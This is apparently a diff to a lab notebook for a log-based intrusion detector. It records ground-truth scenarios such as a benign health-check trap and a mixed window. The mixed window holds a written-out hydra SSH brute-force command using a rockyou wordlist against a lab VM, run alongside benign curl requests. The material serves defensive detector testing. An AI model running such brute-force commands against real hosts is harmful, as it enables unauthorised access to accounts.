@@ -142,3 +142,12 @@ Observations that affect the parser and detectors:
 - Expected: BENIGN false-positive TRAP: a monitoring loop polling /health from Kali (192.168.214.130) ~20 times, 3s apart, UA 'HealthMonitor/1.0'. Expect ~20 GETs to /health, all 200, one repeated path. Web-scan detector keys on many DISTINCT paths / 404s, so this must NOT alarm - but a naive volume-only rule would false-positive here. This case defines that boundary.
 - Attack exit code: 0. auth.log lines in window (approx): 32
 - Logs copied to: data/raw/benign_health_monitor_01/ (auth.log, ufw.log, nginx_access.log, attack_output.txt)
+
+## mixed_bruteforce_and_browsing_01 (2026-10-21T18:36:01Z UTC)
+- Target: ubuntu-target @ 192.168.214.129 (verified). Kali: kali@192.168.214.130. Logs via adm-group read (no password).
+- Window (target clock, UTC): start=2026-10-21T18:36:01Z end=2026-10-21T18:36:46Z
+- Clock check: target=2026-10-21T18:36:01Z kali=2026-10-21T18:36:01Z
+- Attack (from Kali): `( for i in $(seq 1 10); do curl -s -o /dev/null -A "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0" http://192.168.214.129/; sleep 2; done ) & head -n 50 /usr/share/wordlists/rockyou.txt > /tmp/wl50.txt; hydra -l labuser -P /tmp/wl50.txt -t 4 -I -o /tmp/hydra_mixed.txt ssh://192.168.214.129; wait`
+- Expected: MIXED window (ground truth = malicious): an SSH brute force against labuser (rockyou top-50, correct password NOT in list, failures only) running CONCURRENTLY with benign browser GETs to /, all from Kali (192.168.214.130). auth.log should show many Failed password for labuser; nginx should show a handful of benign 200s. The detector must flag the SSH brute force while the web browsing is benign noise in the same window.
+- Attack exit code: 0. auth.log lines in window (approx): 183
+- Logs copied to: data/raw/mixed_bruteforce_and_browsing_01/ (auth.log, ufw.log, nginx_access.log, attack_output.txt)
